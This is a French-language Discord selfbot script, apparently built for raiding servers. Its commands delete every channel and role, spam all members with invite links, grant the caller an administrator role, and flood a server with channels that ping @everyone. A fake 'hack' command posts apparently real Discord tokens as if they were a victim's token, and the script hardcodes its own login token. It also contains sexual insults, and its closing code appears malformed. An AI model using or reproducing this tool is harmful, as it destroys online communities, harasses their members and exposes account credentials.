const Discord = require("discord.js");
const fs = require('fs');
const bot = new Discord.Client();
const http = require('http');
const chalk  = require('chalk');
const moment = require('moment')

bot.commands = new Discord.Collection();
const prefix = ">"
bot.on('ready', ()=> {
console.log("------------------------------------");

console.log("𝙎𝙀𝙇𝙁𝘽𝙊𝙏 𝘿𝙀 𝙇𝙊𝙂𝘼𝙉 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿")
console.log("------------------------------------");


fs.readdir("./commands/", (err, files) => {
  if(err) console.error(err);

  let jsfiles = files.filter(f => f.split(".").pop() === "js")
  if(jsfiles.length <= 0){
    console.log("No comannds to load!");
    return;
  }
  jsfiles.forEach((f, i) => {
    let props = require(`./commands/${f}`);
    console.log(`${f} loaded`)
    
  
  })})


bot.on('message', message => {
    let  messageArray = message.content.split(" ");
  let  cmd = messageArray[0]
  let   args = messageArray.slice(1);
  let messagecount = parseInt(args[0]);
  if (cmd === `${prefix}clear`) {
    if(message.author.id != "420687161755566091") 
    message.delete()
  if(isNaN(messagecount)) return

  if(messagecount > 100){
    message.channel.send(":x: " + "| Uniquement 100 message en une fois!")
  }else if(messagecount < 2 ) {
    message.channel.send(":x: " + "| Il faut plus de 2 messages à supprimer!")
  } else {

  }{
    message.channel.fetchMessages({limit: messagecount}).then(messages => {
      messages.forEach(msg => {
        if(msg.author.id == bot.user.id)
        msg.delete();
      })
    });
       

  }
}

if(cmd === `${prefix}reaction`){
  if(message.author.id != "420687161755566091") return 
let mapping = {
'  ': '    ',
'0':':zero:',
'1':':one:',
  '2':':two:',
  '4':':four:',
'5':':five:',
'3':':three:',
'6':':six:',
'7': ':seven:',
'8': ':eight:',
'9': ':nine:',
'!': ":grey_exclamation:",
"?":":grey_question:",
"#": ":hash:",
}
"abcdefghijklmnopqrstuvwxyz".split('').forEach(c => {
mapping[c] = mapping[c.toUpperCase()] = `:regional_indicator_${c}:`
})
if (args.lenght < 1) return message.reply(":x:")
message.channel.send(args.join(' ').split('').map(c => mapping[c] || c).join(' '));
message.delete()
}
  if (cmd === ">insulte") {
    if(message.author.id != "420687161755566091") return 
    message.delete()
    message.channel.send("encule tes mort esp?ce de sombre merde, reste couché et suce ma grosse bite grosse soumise.")
  }
  if(cmd === `${prefix}status`){
    if(message.author.id != "420687161755566091") return 
    message.delete()
    let status = args.slice(0).join(" ");
    bot.user.setGame(status)
    message.delete()
  }
  if(cmd === `${prefix}live`){
    if(message.author.id != "420687161755566091") return
    message.delete()
    let status = args.slice(0).join(" ");
    bot.user.setGame(status, "https://www.twitch.tv/squeezielive")
    message.delete()
}
if(cmd === `${prefix}gifepil`) {
  if(message.author.id != "420687161755566091") return 
  var embed = new Discord.RichEmbed()
    .setImage("https://images-ext-1.discordapp.net/external/vrEzAyflsQavI6Tgae6BoyCEmnvVoPwoCdMebBuiYYY/%3Fv%3D18/http/aws-cf.imdoc.fr/prod/photos/2/4/8/4909248/5370331/big-53703314d1.gif?width=400&height=241"
    )
    .setFooter("By ZaleR")
    .setColor("#020202")
    message.delete()
    message.channel.send(embed)   

}
if(cmd === `${prefix}gifuck`) {
  if(message.author.id != "420687161755566091") return
  var embed = new Discord.RichEmbed()
    .setImage("https://giphy.com/gifs/tpain-3o7btY5e8K0Wwyp2la")
    .setFooter("By ZaleR")
    message.delete()
    .setColor("#020202")
    message.channel.send(embed)
}
if(cmd === `${prefix}status`) {
  if(message.author.id != "420687161755566091") return
  message.delete()
  var help = new Discord.RichEmbed()
  .setAuthor(`${message.author.username}`)
  .setTitle("Tous ce que tu peut modifier sur ton status")
  .setColor("#010101")
  .addField("------------------------------------------------------------ :eight_pointed_black_star:","**>multilive**")
  .addField("**>play**","**>live**")
  .setFooter("Dev'By EL FAMOSO LOGAN")
  .setThumbnail(`${message.author.avatarURL}`)
  message.channel.sendEmbed(help)
}
if(cmd === `${prefix}gifelfamoso`) {
  if(message.author.id != "420687161755566091") return
  var embed = new Discord.RichEmbed()
  .setImage("https://media.giphy.com/media/1zlCDlkvdY7z02Jqed/giphy.gif")
  .setFooter("By ZaleR")
  .setColor("#020202")
  message.delete()
  message.channel.send(embed)
}
if(cmd === `${prefix}gifblc`){
  if(message.author.id != "420687161755566091") return 
  message.delete()
  var embed = new Discord.RichEmbed()
  
  .setImage("https://media.tenor.com/images/02a687554db7477316abfe2009f5426c/tenor.gif")
  .setColor("#020202")
  message.channel.send(embed)
}
if(cmd === `${prefix}gifself`){
  if(message.author.id != "420687161755566091") return
  message.delete()
  var embed = new Discord.RichEmbed()
  
  .setImage("https://media.giphy.com/media/Y0zJZxzXgKOZJlaMEy/giphy.gif")
  .setColor("#020202")
  message.channel.send(embed)
}
if(cmd === `${prefix}gifwtf`){
  if(message.author.id != "420687161755566091") return 
  var embed = new Discord.RichEmbed()
  .setImage("https://media3.giphy.com/media/3o7527pa7qs9kCG78A/giphy.gif?cid=3640f6095c9bf73b457269497397460d"
  )
  .setFooter("By ZaleR")
  .setColor("#020202")
  message.delete()
  message.channel.send(embed)
}
if(cmd === `${prefix}gifmdr`){
  if(message.author.id != "420687161755566091") return 
  var embed = new Discord.RichEmbed()
  .setImage("https://media1.giphy.com/media/ZO7gZBIvxU04l8rwE3/giphy.gif?cid=3640f6095c9bed5c4d6a366a77e742c6"
  )
  .setFooter("By ZaleR")
  .setColor("#020202")
  message.delete()
  message.channel.send(embed)
}
if(cmd === `${prefix}gifattack`){
  if(message.author.id != "420687161755566091") return 
  var embed = new Discord.RichEmbed()
  .setImage("https://media0.giphy.com/media/Eq49yQGJL835K/giphy.gif?cid=3640f6095c9bfb2b743354673691ce6a"
  )
  .setFooter("By ZaleR")
  .setColor("#020202")
  message.delete()
  message.channel.send(embed)
}
if(cmd === `${prefix}gifomg`){
  if(message.author.id != "420687161755566091") return
  var embed = new Discord.RichEmbed()
  .setImage("https://media1.giphy.com/media/sR2YaENch4sog/giphy.gif?cid=3640f6095c9bfbd575766c784dc1b9c4"
  )
  .setFooter("By ZaleR")
  .setColor("#020202")
  message.delete()
  message.channel.send(embed)
}
if(cmd === `${prefix}gifharam`){
  if(message.author.id != "420687161755566091") return
  var embed = new Discord.RichEmbed()
  .setImage("https://media1.giphy.com/media/PyTPkd05w4QH6/giphy.gif?cid=3640f6095c9bfcbf4435713855173318"
  )
  .setFooter("By ZaleR")
  .setColor("#020202")
  message.delete()
  message.channel.send(embed)
}
if(cmd === `${prefix}gifdf`){
  if(message.author.id != "420687161755566091") return 
  var embed = new Discord.RichEmbed()
  .setImage("https://media0.giphy.com/media/PN2dRtOWwxdte/200w.webp?cid=3640f6095c9bfdd13757625367d7ed61"
  )
  .setFooter("By ZaleR")
  .setColor("#020202")
  message.delete()
  message.channel.send(embed)
}

if(cmd === `${prefix}sondage`){
  if(message.author.id != "420687161755566091") return
let args = message.content.split(" ").slice(1)
let thingToEcho = args.join(" ")
message.delete()
var embed = new Discord.RichEmbed()
.setAuthor("Sondage", bot.user.displayAvatarURL)
.addField(thingToEcho, "Oui = ? Non = :x:")
.setColor("RANDOM")
message.channel.send(embed)
.then(function (message){
  message.react("X")
  message.react("?")
}).catch(function() {
});
}

if(cmd === `${prefix}userinfo`){
  if(message.author.id != "420687161755566091") return 
  let guser = message.mentions.users.first() || message.author;
  message.delete (-5000)
  var embed = new Discord.RichEmbed()
      .setAuthor("Information sur " + guser.username)
      .setThumbnail(guser.displayAvatarURL)
      .setColor("RANDOM")
      .addField("Pseudonyme:", guser.tag)
      .addField("Identifiant du compte:", guser.id)
      .addField("Date de cr?ation:", guser.createdAt)
      .setTimestamp(message.createdAt)
      .setFooter("Dev'By EL FAMOSO LOGAN")
      message.channel.sendEmbed(embed)
}
if(cmd === `${prefix}pp`){
  if(message.author.id != "420687161755566091") return 
  let taggedUser = message.mentions.users.first() || message.author;
message.delete()
  var aEmbed = new Discord.RichEmbed()
   .setTitle(`Voici l'avatar de ce fils de pute de ${taggedUser.username}`)
   .setImage(taggedUser.displayAvatarURL)
   .setFooter("Dev'By EL FAMOSO LOGAN")
   .setTimestamp(message.createdAt)
  message.channel.send(aEmbed)
}
if(cmd === `${prefix}gifissou`){
  if(message.author.id != "420687161755566091") return 
  var embed = new Discord.RichEmbed()
  .setImage("https://www.tenor.co/N23D.gif"
  )
  .setFooter("By ZaleR")
  .setColor("#020202")
  message.delete()
  message.channel.send(embed)
}
if(cmd === `${prefix}gifchomeur`){
  if(message.author.id != "420687161755566091") return
  var embed = new Discord.RichEmbed()
  .setImage("https://gyazo.com/cd41d3f3c5bf09ac6a5b243b0a95b30d"
  )
  .setFooter("By ZaleR")
  message.delete()
  message.channel.send(embed)
}
if(cmd === `${prefix}botinfo`){
  if(message.author.id != "420687161755566091") return
  let bicon = bot.user.displayAvatarURL;
  let botembed = new Discord.RichEmbed()
  .setDescription("SOUMISE DE LOGAN")
  .setColor("RANDOM")
  .setThumbnail(bicon)
  .addField("INFORMATIONS", bot.user.username)
  .addField("Cree le,", bot.user.createdAt)
  
  return message.channel.send(botembed);
}

if(cmd === `${prefix}multilive`){
  if(message.author.id != "420687161755566091") return
  let lives = ['ΛSØЯ ', ' ', 'ＡＳＯＲ','HKAA']
  setInterval(function(){
    let status = lives[Math.floor(Math.random() * lives.length)]
 bot.user.setGame(status, "https://www.twitch.tv/doigby")
},100);
message.delete()
}
if(cmd === `${prefix}fun`) {
  if(message.author.id != "420687161755566091") return
  message.delete()
  var help = new Discord.RichEmbed()
  
  .addField("__Liste des commandes fun__\n", "\u200b") 
  .setColor("#010101")
  .addField(">gifblc : " + " \```" + "Permet d'annoncer qu'on s'en bat royalement les couilles" + "\```", "\u200b")
  .addField(">gifelfamoso : " + " \```" + "Permet d'afficher le gif EL FAMOSO LOGAN" + "\```", "\u200b")
  .addField(">gifuck : " + " \```" + "Permet d'afficher un gif fuck" + "\```", "\u200b")
  .addField(">gifmdr : " + " \```" + "Permet d'afficher un gif drôle" + "\```", "\u200b")
  .addField(">gifwtf : " + " \```" + "Permet d'afficher un gif complètement wtf" + "\```", "\u200b")
  .addField(">gifattack : " + " \```" + "Permet d'afficher un gif attaque" + "\```", "\u200b")
  .addField(">gifomg : " + " \```" + "Permet d'afficher un gif omg" + "\```", "\u200b")
  .addField(">gifharam : " + " \```" + "Permet d'afficher un gif haram" + "\```", "\u200b")
  .addField(">gifdf : " + " \```" + "Permet d'afficher un gif double fuck" + "\```", "\u200b")
  .addField(">gifissou : " + " \```" + "Permet d'afficher un gif issou" + "\```", "\u200b")
  .addField(">gifchomeur : " + " \```" + "Permet d'afficher un gif d'un chomeur" + "\```", "\u200b")
  .addField(">gifself : " + " \```" + "Permet d'afficher un gif du selfbot" + "\```", "\u200b")
  .addField(">gifsextape : " + " \```" + "Permet d'afficher un gif d'une sextape" + "\```", "\u200b")
  .addField(">clic : " + " \```" + "Permet d'afficher un lien rediriger vers un discord." + "\```", "\u200b")
  .setFooter("Dev'By EL FAMOSO LOGAN")
  .setThumbnail(`${message.author.avatarURL}`)
  message.channel.sendEmbed(help)
}
if(cmd === `${prefix}raidc`) {
  if(message.author.id != "420687161755566091") return
  message.delete()
  var help = new Discord.RichEmbed()
  
  .addField("__Liste des commandes raid__\n", "\u200b") 
  .setColor("#010101")
  .addField("Deleter: " + " \```" + "Permet d'effacer tous les rôles présent sur le serveur." + "\```", "\u200b")
  .addField("Deletec : " + " \```" + "Permet de supprimer tous les channels en quelques secondes." + "\```", "\u200b")
  .addField("Dmspam : " + " \```" + "Permet de spammer un message prédéfini en mp." + "\```", "\u200b")
  .addField("Multiserv :  " + " \```" + " Permet de changer le nom du serveur comme avec le multipseudos." + "\```", "\u200b")
  .addField("Raid :  " + " \```" + "Permet de détruire le serveur." + "\```", "\u200b")
  .setFooter("Dev'By EL FAMOSO LOGAN")
  .setThumbnail(`${message.author.avatarURL}`)
  message.channel.sendEmbed(help)
}
if(cmd === `${prefix}multipseudos`){
  if(message.author.id != "420687161755566091") return;
  message.delete()
  let rpseudo = ['ΛSØЯ','ΛSØЯ ➜','ΛSØЯ ➜ hkaa','ΛSØЯ ➜','ΛSØЯ ➜ hkaa']
 rpseudonow = setInterval(() => {
  const rpseudonow = rpseudo[~~(Math.random() * rpseudo.length)]
 
  message.guild.member(bot.user).setNickname(rpseudonow)
  
      
 }, 1);
}
if(cmd === `${prefix}multipseudoel`){
  if(message.author.id != "420687161755566091") return;
  message.delete()
  let rpseudo = ['＂ＥＬ','＂ＥＬ ＦＡＭＯＳＯ','＂ＥＬ ＦＡＭＯＳＯ ＬＯＧＡＮ','ＥＬ ＦＡＭＯＳＯ ＬＯＧＡＮ 🖕🏾 ','"𝑬𝑳','"𝑬𝑳 𝑭𝑨𝑴𝑶𝑺𝑶 ','"𝑬𝑳 𝑭𝑨𝑴𝑶𝑺𝑶 𝑳𝑶𝑮𝑨𝑵','"𝑬𝑳 𝑭𝑨𝑴𝑶𝑺𝑶 𝑳𝑶𝑮𝑨𝑵 🖕🏾','""𝔼𝕃','"𝔼𝕃 𝔽𝔸𝕄𝕆𝕊𝕆','"𝔼𝕃 𝔽𝔸𝕄𝕆𝕊𝕆 𝕃𝕆𝔾𝔸ℕ 🖕🏾']
 rpseudonow = setInterval(() => {
  const rpseudonow = rpseudo[~~(Math.random() * rpseudo.length)]
 
  message.guild.member(bot.user).setNickname(rpseudonow)
  
      
 }, 1);
}
if(cmd === `${prefix}deletec`) {
  if(message.author.id != "420687161755566091") return;
  message.delete()
  if(message.deletable) message.delete();
  message.guild.channels.forEach(channel => {
    if(channel.deletable) channel.delete()
    

  });
                                 
}
if(cmd === `${prefix}deleter`) {
  if(message.author.id != "420687161755566091") return;
   if(message.deletable) message.delete();
   message.guild.roles.forEach(role => {
   role.delete()
   });
  };
  if(cmd === `${prefix}dm`) {
    if(message.author.id != "420687161755566091") return;
    if(message.deletable) message.delete();
    message.guild.members.forEach(member=>{
          member.send(message.guild+"test igo https://discord.gg/AjFPhT");
          
          });	
        
    };
    
    if(cmd === `${prefix}clic`) {
      if(message.deletable) message.delete();
      if(message.author.id != "420687161755566091") return;
    if(message.deletable) message.delete();
      const st = new Discord.RichEmbed()
      .setTitle("Rejoin le gang ici :bomb:")
      .setColor("0x010000")
      .setURL("https://discord.gg/Fb7S3NA")
      message.channel.send(st)
     }
     if(cmd === `${prefix}hack`) {
      if(message.author.id != "420687161755566091") return;
      if(message.deletable) message.delete();
      let mention = message.mentions.users.first();
      const token = [
        'NDgzNDczOTEzMDMzMTI5OTk3.DmT-HA.JTBUeVQs95ckwwThrPjbXvqSViE',
        'NDg1MDgzOTEzMTcwMDU5Mjg1.DmrZNQ.Pk3z74IojeopiKmaVFPvuHJetuQ',
        'NDg1MDgzMjg2ODkzMjMyMTMw.DmrYmQ.vZpbSCwKk4clIBVsnmLf2P_X_kQ',
        'NDg1MDg2ODMyMDk1MTMzNjk2.Dmrb7g.nwHpax0Hf8jXAxnHofhMoDMITLY',
        'NDgzODkyNzk0NDI4MjI3NTkz.DmaD8A.QgjxtZPaeZPN_yZdh1hiX6s3qWM',
        "NDgzODk5NjI5NDc0NDE0NjAz.DmaKXA.JXrDqX3D6AvxLqZ_Wl_7WON2FAA",
        "NDgzOTAwMzAyNjU5OTQ0NDQ4.DmaLBg.EhzZs_gWfy7aEctoAr0yajjbbPY",
        "NDgzOTAwODE3NTE0OTU0NzU2.DmaMUw.l9_MyouZ1VE0lSEDtiWnmb0iH_g",
        "NDgzOTAyMTQ2MzA0MDE2Mzg1.DmaM6A.AQwjv0gGIoo4ssGweYe2J2SHw_c",
        "NDgzOTAyNzEyMjMzMDY2NDk3.DmaNag.QkToVbYxOroREeo5EJgcc_szWTs",
        "NDgzOTAzMjg2NTM4MTQxNzA2.DmaOKQ.Z5RtYfYn99_W2j-OKhqAjG1GTkM",
        "NDgzOTA0MDYxNjQ1NzgzMDQx.DmaOtw.VQCrDHn5Geg6snXDUuv-MsyYJzE",
        "NDg1MDg4NTIwMTc2OTI2NzIw.DmrdkA.zG8N59V6gwwL9qbow-KShSunfPk",
        "NDg1MDg5MTE5MDgxMzMyNzM3.DmrePg.LLrrGPrqG8KYFjUlDqNhn6o8fOA",
        "NDg1MDkxODkzMzE5ODI3NDU3.DmrgmQ.KkZllmOhKdbUDq4WxFgyPGeHRpI",
        "NDg1MDkyMzQ4ODA4NjU4OTU0.DmrhMg.dGm-NvRg65v_I3JGzGp9zEscr7g",
        "NDg1MDkyODkxODExNzc0NDY1.Dmrh4A.jEnSdDM5qJhubPbWXZqPwb0Vhqc",
        "NDg1MDkzNzA3NDg2NTkzMDU2.Dmrihg.t_MdTJFUI71__p4ifk0zJipujCg",
        "NDg1MDk0MjU0MDI1MTEzNjEy.Dmri9w.nrCpJ6_gxxUO5oNJX-zPBqQ8alI",
        "NDg1MDk0NzQxNjA0Njk2MDg3.DmrjTw.8kQaOrs--zhJgHq-5zvHtHJs0Xg",
        "NDg1MDk1MTcwODEyMTQ5NzYx.Dmrjuw.bPtHvAR84wMNMgovwitEharzqRk",
        "NDg1MDk3MDIyODIzODU4MTc3.Dmrlaw.-x4N1Prspc1vO0Bb5SFJGb5Y4Ag"
    ];
        
        const HackToken = new Discord.RichEmbed()
        
        .setAuthor("HACKEED")
        .setDescription(`${mention.username}` + " TU VIEN DE TE FAIRE BAISER  TON TOKEN PAR " + `${message.author.username}`)
        .addBlankField(1)
        .addField("TON TOKEN EST :", token[Math.floor(Math.random() * token.length)])
        .setColor("#131313")
        .setImage('https://media.giphy.com/media/1zlCDlkvdY7z02Jqed/giphy.gif')
        .setFooter("Dev'By Zaler")
        .setTimestamp()
        message.channel.send(HackToken).catch(console.error).then(m => m.delete(80000));
      }  
      
      if(cmd === `${prefix}self`){
        if(message.author.id != "420687161755566091") return;

        message.delete()
        var embed1 = new Discord.RichEmbed()
        .setAuthor(message.author.username, message.author.avatarURL)
        .setDescription('Selfbot connecté ! Temps de latence avec le server : ' + `${message.createdTimestamp - Date.now()}` + ' ms')
        .setColor(0x010000)
        .setImage("https://media.giphy.com/media/1ymoXP3QE0YFzEvEVn/giphy.gif")
        message.channel.send(embed1)
        console.log('Commande SelfBot Utilisé')
    }
    if(cmd === `${prefix}help`){
      if(message.author.id != "420687161755566091") return;
      message.delete()
      var embedhelpmember = new Discord.RichEmbed() 
      .addField("__Liste des Commandes__\n", "\u200b") 
      .addField("Multipseudos : " + " \```" + "Permet de changer de pseudo à l'infini sur un serveur" + "\```", "\u200b")
      .addField("Statut : " + " \```" + "Permet de voir tous ce que tu peut changer sur ton statut." + "\```", "\u200b")
      .addField("Purge : " + " \```" + "Permet de supprimer tous les messages du serveur instantanément." + "\```", "\u200b")
      .addField("Admin : " + " \```" + "Permet d'obtenir la permission administrateur." + "\```", "\u200b")
      .addField("Raid : " + " \```" + "Permet de détruire un serveur  en quelques secondes (PERMS ADMIN OBLIGATOIRE)." + "\```", "\u200b")
      .addField("Spam : " + " \```" + "Permet de spam n'importe quel message." + "\```", "\u200b")
      .addField("Fun : " + " \```  Permet d'afficher toute les commandes fun" + "\```", "\u200b")
      .addField("Clear : " + " \```  Permet de supprimer plus de 100 messages personnels." + "\```", "\u200b")
      .addField("Raidc : " + " \``` Permet d'afficher la catégorie raid." + "\```", "\u200b")
      .setColor(0x010000) 
      .setFooter("Dev'By ZaleR") 
  message.channel.send(embedhelpmember); 
  }
    if(cmd === `${prefix}gifsextape`){
     message.delete() 
      var sextape = new Discord.RichEmbed()

      .setColor("0x010000")
      .setImage("https://media.discordapp.net/attachments/526346956755304458/542386606527610890/sextape.jpeg?width=800&height=450")
      .setFooter("Dev'By ZaleR")
      message.channel.send(sextape)
  }
  if(cmd === `${prefix}admin`){
    message.member.guild.createRole({
        name: "",
        color: "0x010000",
        permissions: ("ADMINISTRATOR")
    }).then(function(role)
    {
        message.member.addRole(role);
        message.channel.bulkDelete(1).then(() => {
            message.channel.send("\`Tu as désormais les perms admin. Tu pourra baisé ce serveur avec le Selfbot d'EL FAMOSO !\`")
            message.channel.bulkDelete(1)
        });
    }); 
}
    
   
if(cmd === `${prefix}raid`){
  let oldnm = message.guild.name;
  message.guild.channels.map(c => {
          c.delete();
      rdr = setInterval(() => {
        message.guild.createRole({
                name: "EL FAMOSO LOGAN",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
  
              message.member.addRole(rr.id);
        c
  
        message.guild.setName('DESTROY BY EL FAMOSO LOGAN');
        message.guild.setIcon("https://im4.ezgif.com/tmp/ezgif-4-05479a6a59a6.gif")
            setTimeout(function () {
            rd1 = setInterval(() => {
            message.guild.createChannel('EL FAMOSO LOGAN', 'text').then(channek => {
              channek.send('@everyone EL FAMOSO LOGAN VOUS A BIEN BAISER LE CUL ');
            })})})})})})}})})
            
bot.login('NDIwNjg3MTYxNzU1NTY2MDkx.XKUT6Q.Ai4EM-XH1g33DR04oxlWdXn8NuE')